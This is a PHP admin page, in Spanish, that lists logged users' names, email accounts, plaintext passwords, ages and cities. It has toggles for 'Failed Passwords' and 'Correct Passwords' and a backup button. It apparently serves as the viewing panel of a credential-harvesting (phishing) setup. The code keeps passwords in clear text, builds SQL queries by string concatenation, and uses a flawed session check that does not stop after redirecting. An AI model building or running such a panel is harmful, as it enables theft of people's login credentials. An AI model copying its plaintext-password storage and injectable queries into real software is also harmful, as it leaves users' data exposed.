
<?php 
session_start();
if (!isset($_SESSION['app_id'] ) and empty($_SESSION['app_id'] ) ) {
	session_destroy();
	header("Location: index.php");
}

if (isset($_GET['logout']) ) {
	session_destroy();
	header("Location: index.php");
}

#require_once("seguridad.php");
require_once("../Models/Conexion.php");

$db= New Conexion();
$sql="SELECT * FROM logs  ";
if (isset($_GET['fail'])) {
	$sql.=" WHERE FAIL IS  NOT NULL ";
} else {
	$sql.=" WHERE FAIL IS   NULL ";
}
$sql.=" GROUP BY CLAVE ORDER BY logs.FECHA  DESC,  logs.HORA  DESC ";
$datos=  $db->consultaRetorno($sql);
$total = $db->total_rows($datos);




?>
<html>
<head>
	<meta charset="utf-8">
	<link rel="shortcut icon" type="image/ico" href="../dist/img/user1-128x128.jpg">
	<meta name="viewport" content="initial-scale=1.0, maximum-scale=2.0">
	<title>Admin</title>
	<link rel="stylesheet" type="text/css" href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
	<link rel="stylesheet" type="text/css" href="media/css/dataTables.bootstrap.css">
	<link rel="stylesheet" type="text/css" href="media/css/syntax/shCore.css">
	<link rel="stylesheet" type="text/css" href="media/css/demo.css">

	<style type="text/css" class="init">

	</style>
	<script type="text/javascript" language="javascript" src="//code.jquery.com/jquery-1.11.3.min.js">
	</script>
	<script type="text/javascript" language="javascript" src="media/js/jquery.dataTables.js">
	</script>
	<script type="text/javascript" language="javascript" src="media/js/dataTables.bootstrap.js">
	</script>
</script>
<script type="text/javascript" language="javascript" class="init">

	$(document).ready(function() {
		$('#example').DataTable({
			"iDisplayLength": -1,
			"lengthMenu": [[10, 25, 50, -1], [10, 25, 50, "All"]],
			"autoWidth": false,
		  "columns": [                // there must be an entry for every column
		  {"width": "25%", "orderable": true},     
		  null,
		  null,
		  null,
		  null,
		  {"width": "25%", "orderable": true},
		  null
		  ],
		  "order": [[ 5, "desc" ]],
		  "sPaginationType": "full_numbers"

		});
	} );

</script>

<style type="text/css">

	.even 
	{
		background: #FCF2E9;
	}
	th 
	{
		background: #F37800;
		text-align: center;
		color: white;
	}

</style>
</head>
<body class="dt-example dt-example-bootstrap">
	<div  style="margin:0px 100px 10px 100px;">

		<h1><b>Registro de Usuarios <span>Admin</span></b></h1>

		<table id="example" class="table table-striped table-bordered" cellspacing="0" width="100%" class="pretty">
			<thead>
				<tr>
					<td colspan="7">
						<div align="right">
							<button class="btn btn-info" onclick="window.location.href='backup.php' ">Backup</button>
							<!--<button class="btn btn-warning" onclick="window.location.href='mail.php' "> Send Mail</button>-->
							<?php if (!isset($_GET['fail'])) { ?>
							<button class="btn btn-danger" onclick="window.location.href='?fail' ">Failed Passwords</button>
							<?php } else {?>
							<button class="btn btn-success" onclick="window.location.href='listar.php' ">Correct Passwords</button>
							<?php } ?>
							<button class="btn btn-info" onclick="window.location.href='?logout' ">Logout</button>
						</div> 
					</td>
				</tr>
				<tr>
					<th >Nombre</th>
					<th>Cuenta</th>
					<th>Contraseña</th>
					<th>Edad</th>
					<th>Ciudad</th>
					<th>FechaLog</th>
					<th>&nbsp;</th>
				</tr>
			</thead>

			<tbody>
				<?php 
				while ( $row_query =   $db->row($datos)) 
				{ 
					?>
					<tr >
						<td>
							<?php echo ucwords(strtolower($row_query['NOMBRE'])); ?>
						</td>						
						<td><?php echo strtolower($row_query['EMAIL']); ?></td>
						<td><?php echo $row_query['CLAVE']; ?></td>
						<?php 
						$queryEdad="SELECT YEAR(CURDATE())-YEAR(FECHA_NAC) + IF(DATE_FORMAT(CURDATE(),'%m-%d') > DATE_FORMAT(FECHA_NAC,'%m-%d'), 0, -1) 
						AS EDAD_ACTUAL  FROM logs WHERE ID='".$row_query['ID']."' AND FECHA_NAC!='0000-00-00' ";
						$edad=  $db->consultaRetorno($queryEdad);

						$rowEdad=$db->row($edad)								
						?>
						<td><?php if ($rowEdad['EDAD_ACTUAL']!="") { echo $rowEdad['EDAD_ACTUAL'];} ?></td>
						<td>
							<?php 
							if ($row_query['CIUDAD']!="") 
							{
								$queryCiudades= "SELECT * FROM ciudad WHERE COD_CIUDAD='".$row_query['CIUDAD']."'  ";
								$ciudades = $db->consultaRetorno($queryCiudades);
								$rowCiudades=$db->row($ciudades);
								echo ucwords(strtolower($rowCiudades['CIUDAD']));
							}
							?>
						</td>
						<td><?php echo $row_query['FECHA']." ".$row_query['HORA']; ?></td>
						<td>
							<button type="button" class="btn btn-default" aria-label="Left Align" onclick="window.location.href='editar.php?ID=<?php echo $row_query['ID']; ?>' ">
								<span class="glyphicon glyphicon-pencil" aria-hidden="true">

								</span>
							</button>
						</td>	
					</tr>
					<?php } ?>		
				</tbody>
			</table>

		</div>


	</body>
	</html>